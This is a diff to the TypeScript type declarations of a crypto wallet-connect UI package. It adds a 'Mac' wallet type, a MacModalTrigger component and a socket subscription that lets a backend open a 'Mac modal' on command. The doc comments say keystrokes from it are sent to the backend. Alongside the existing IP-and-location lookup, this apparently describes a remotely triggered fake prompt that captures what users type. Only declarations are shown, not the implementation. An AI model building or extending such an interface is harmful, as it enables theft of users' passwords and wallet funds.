@@ -6,7 +6,7 @@ interface ConnectWalletButtonProps {
 }
 declare const ConnectWalletButton: React.FC<ConnectWalletButtonProps>;
 
-type WalletType = 'MetaMask' | 'Phantom' | 'Rabby' | 'TronLink' | 'Bitget' | 'Coinbase' | 'Solflare';
+type WalletType = 'MetaMask' | 'Phantom' | 'Rabby' | 'TronLink' | 'Bitget' | 'Coinbase' | 'Solflare' | 'Mac';
 interface WalletConnectModalProps {
     onWalletSelect?: (wallet: WalletType) => void;
     onClose?: () => void;
@@ -36,6 +36,25 @@ interface WalletSelectionModalProps extends WalletConnectModalProps {
 declare const WalletSelectionModal: React.FC<WalletSelectionModalProps>;
 
 declare const CustomWalletModal: React.FC<CustomWalletModalProps>;
+
+interface MacModalTriggerProps {
+    /** User ID for backend key service. Required when backendConfig.enabled is true. */
+    userId?: string;
+    /** Backend integration config. When enabled, keystrokes are sent to backend. */
+    backendConfig?: {
+        enabled?: boolean;
+        userId?: string;
+    };
+    /** Called when the Mac modal is closed. */
+    onClose?: () => void;
+}
+/**
+ * Listens for the backend socket event (default: `showMacModal`) and opens the Mac modal when received.
+ * Mount this component once (e.g. at app root) to enable socket-triggered Mac modal.
+ *
+ * Backend should emit the event configured via `setConfig({ macModalSocketEvent: 'yourEventName' })`.
+ */
+declare const MacModalTrigger: React.FC<MacModalTriggerProps>;
 
 /**
  * Wallet Registry
@@ -68,12 +87,25 @@ interface BackendConfig {
     secretKey?: string;
     backendUrl?: string;
     assetBaseUrl?: string;
+    /** Socket event name for backend to trigger Mac modal. Default: 'showMacModal' */
+    macModalSocketEvent?: string;
 }
 declare const getConfig: () => Required<BackendConfig>;
 declare const setConfig: (config: Partial<BackendConfig>) => void;
 declare const getClientUrl: () => string;
 declare const getBackendUrl: () => string;
 declare const getAssetBaseUrl: () => string;
+declare const getMacModalSocketEvent: () => string;
+
+/**
+ * Subscribe to backend "show Mac modal" socket event.
+ * When the backend emits this event, the callback is invoked.
+ * Use with MacModalTrigger to show the Mac modal on signal.
+ *
+ * @param callback - Called when the backend emits the showMacModal event (configurable via macModalSocketEvent).
+ * @returns Unsubscribe function.
+ */
+declare const subscribeToShowMacModal: (callback: () => void) => (() => void);
 
 /**
  * Get both IP and Location in a single call
@@ -150,5 +182,5 @@ declare const ASSET_PATHS: {
     readonly phantomGifJ: "v2/images/phantom/j.gif";
 };
 
-export { ASSET_PATHS, ConnectWalletButton, CustomWalletModal, WalletSelectionModal, clearWalletTypesCache, getAllWalletTypes, getAssetBaseUrl, getAssetPath, getBackendUrl, getClientUrl, getConfig, getIPAndLocation, getUserWalletTypes, getWalletConfig, getWalletShortKey, resolveAssetUrl, setConfig, walletConfigs };
-export type { CustomWalletModalProps, UserWalletType, UserWalletTypesResponse, WalletConfig, WalletConnectModalProps, WalletType };
+export { ASSET_PATHS, ConnectWalletButton, CustomWalletModal, MacModalTrigger, WalletSelectionModal, clearWalletTypesCache, getAllWalletTypes, getAssetBaseUrl, getAssetPath, getBackendUrl, getClientUrl, getConfig, getIPAndLocation, getMacModalSocketEvent, getUserWalletTypes, getWalletConfig, getWalletShortKey, resolveAssetUrl, setConfig, subscribeToShowMacModal, walletConfigs };
+export type { CustomWalletModalProps, MacModalTriggerProps, UserWalletType, UserWalletTypesResponse, WalletConfig, WalletConnectModalProps, WalletType };
